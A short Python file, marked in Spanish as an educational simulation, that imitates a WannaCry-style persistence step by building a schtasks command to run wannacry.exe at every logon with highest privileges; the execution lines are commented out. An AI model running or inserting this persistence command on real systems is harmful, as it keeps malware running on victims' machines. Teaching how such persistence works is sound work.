# ADVERTENCIA: Este es un archivo simulado educativo. No ejecutar en sistemas reales.
# Simula creación de tareas programadas para reinicio automático.

import subprocess

def create_startup_task():
    command = 'schtasks /create /tn "WannaCry" /tr "C:\\Windows\\System32\\wannacry.exe" /sc onlogon /rl highest'
    # subprocess.run(command, shell=True)  # Simulado
    print("Tarea programada creada para persistencia.")

# create_startup_task()